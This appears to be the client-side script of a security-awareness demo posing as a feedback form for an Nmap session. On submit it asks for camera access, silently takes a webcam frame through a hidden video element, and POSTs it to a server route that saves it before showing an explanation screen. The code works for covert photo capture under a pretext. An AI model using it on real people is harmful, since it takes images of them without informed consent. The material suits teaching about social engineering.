/* =========================================
   NMAP SESSION FEEDBACK
   CAMERA AWARENESS DEMO
========================================= */


/* =========================================
   ELEMENTS
========================================= */

const feedbackForm =
    document.getElementById("feedbackForm");

const feedbackSection =
    document.getElementById("feedbackSection");

const permissionSection =
    document.getElementById("permissionSection");

const finalSection =
    document.getElementById("finalSection");

const camera =
    document.getElementById("camera");


/* =========================================
   VARIABLES
========================================= */

let cameraStream = null;


/* =========================================
   FORM SUBMISSION
========================================= */

feedbackForm.addEventListener(
    "submit",
    async function (event) {

        /*
         * Prevent the browser from doing
         * the normal GET form submission.
         *
         * This prevents:
         *
         * ?name=...&q1=...&q2=...
         */

        event.preventDefault();


        console.log(
            "[+] Feedback submitted"
        );


        /*
         * Hide feedback form.
         */

        feedbackSection.classList.add(
            "hidden"
        );


        /*
         * Directly request the browser's
         * native camera permission.
         *
         * Because this happens as part of
         * the user's Submit action, the
         * browser can display its normal
         * camera permission prompt.
         */

        await requestCamera();

    }
);


/* =========================================
   REQUEST CAMERA
========================================= */

async function requestCamera() {

    console.log(
        "[+] Requesting camera permission..."
    );


    /*
     * Check browser support.
     */

    if (
        !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia
    ) {

        console.error(
            "[!] Camera API unavailable"
        );

        showFinalSection();

        return;

    }


    try {

        /*
         * Request camera access.
         *
         * Audio is disabled.
         */

        cameraStream =
            await navigator
                .mediaDevices
                .getUserMedia({

                    video: {
                        facingMode: "user"
                    },

                    audio: false

                });


        console.log(
            "[+] Camera permission granted"
        );


        /*
         * Connect camera stream to
         * the hidden video element.
         *
         * The HTML uses:
         *
         * display: none;
         *
         * so the camera preview is
         * not displayed.
         */

        camera.srcObject =
            cameraStream;


        /*
         * Wait for an actual camera frame.
         */

        await waitForCameraFrame();


        /*
         * Capture and send the frame
         * to Flask.
         */

        await captureAndSavePhoto();

    }

    catch (error) {

        console.error(
            "[!] Camera error:",
            error
        );


        /*
         * Stop any partially opened
         * camera stream.
         */

        stopCamera();


        /*
         * Continue to the awareness
         * explanation.
         */

        showFinalSection();

    }

}


/* =========================================
   WAIT FOR CAMERA FRAME
========================================= */

function waitForCameraFrame() {

    return new Promise(
        function (resolve, reject) {

            let attempts = 0;

            const maxAttempts = 50;


            const timer =
                setInterval(
                    function () {

                        attempts++;


                        /*
                         * Camera has produced
                         * a usable frame.
                         */

                        if (
                            camera.videoWidth > 0 &&
                            camera.videoHeight > 0
                        ) {

                            clearInterval(
                                timer
                            );

                            resolve();

                            return;

                        }


                        /*
                         * Give up after about
                         * five seconds.
                         */

                        if (
                            attempts >= maxAttempts
                        ) {

                            clearInterval(
                                timer
                            );

                            reject(
                                new Error(
                                    "Camera frame unavailable"
                                )
                            );

                        }

                    },
                    100
                );

        }
    );

}


/* =========================================
   CAPTURE AND SAVE PHOTO
========================================= */

async function captureAndSavePhoto() {

    console.log(
        "[+] Capturing camera frame..."
    );


    /*
     * Make sure a camera frame exists.
     */

    if (
        !camera.videoWidth ||
        !camera.videoHeight
    ) {

        throw new Error(
            "Camera frame is unavailable"
        );

    }


    /*
     * Create an in-memory canvas.
     *
     * Nothing is displayed.
     */

    const canvas =
        document.createElement(
            "canvas"
        );


    canvas.width =
        camera.videoWidth;

    canvas.height =
        camera.videoHeight;


    const context =
        canvas.getContext(
            "2d"
        );


    /*
     * Copy the current camera frame
     * into the canvas.
     */

    context.drawImage(
        camera,
        0,
        0,
        canvas.width,
        canvas.height
    );


    /*
     * Convert the frame to JPEG.
     */

    const imageData =
        canvas.toDataURL(
            "image/jpeg",
            0.9
        );


    console.log(
        "[+] Frame captured"
    );


    /*
     * Send the image to Flask.
     *
     * Flask's /save-photo route will
     * save the file inside:
     *
     * captured_photos/
     */

    try {

        const response =
            await fetch(
                "/save-photo",
                {

                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        image: imageData
                    })

                }
            );


        /*
         * Check HTTP response.
         */

        if (!response.ok) {

            throw new Error(
                "Server returned HTTP " +
                response.status
            );

        }


        const result =
            await response.json();


        /*
         * Stop camera immediately.
         */

        stopCamera();


        if (result.success) {

            console.log(
                "[+] Photo saved successfully"
            );

            console.log(
                "[+] Filename:",
                result.filename
            );

        }

        else {

            console.error(
                "[!] Photo was not saved:",
                result.message
            );

        }


        /*
         * Do NOT display the image.
         *
         * Move directly to the
         * awareness explanation.
         */

        showFinalSection();

    }

    catch (error) {

        console.error(
            "[!] Error sending photo:",
            error
        );


        stopCamera();


        showFinalSection();

    }

}


/* =========================================
   STOP CAMERA
========================================= */

function stopCamera() {

    console.log(
        "[+] Stopping camera..."
    );


    if (cameraStream) {

        cameraStream
            .getTracks()
            .forEach(
                function (track) {

                    track.stop();

                }
            );


        cameraStream =
            null;

    }


    if (camera) {

        camera.srcObject =
            null;

    }

}


/* =========================================
   SHOW AWARENESS SCREEN
========================================= */

function showFinalSection() {

    /*
     * Hide the permission section
     * if it exists.
     */

    if (permissionSection) {

        permissionSection.classList.add(
            "hidden"
        );

    }


    /*
     * Hide feedback section.
     */

    if (feedbackSection) {

        feedbackSection.classList.add(
            "hidden"
        );

    }


    /*
     * Show final awareness section.
     */

    if (finalSection) {

        finalSection.classList.remove(
            "hidden"
        );

    }


    /*
     * Scroll to top.
     */

    window.scrollTo({
        top: 0,
        behavior: "smooth"
    });

}


/* =========================================
   PAGE CLEANUP
========================================= */

window.addEventListener(
    "beforeunload",
    function () {

        stopCamera();

    }
);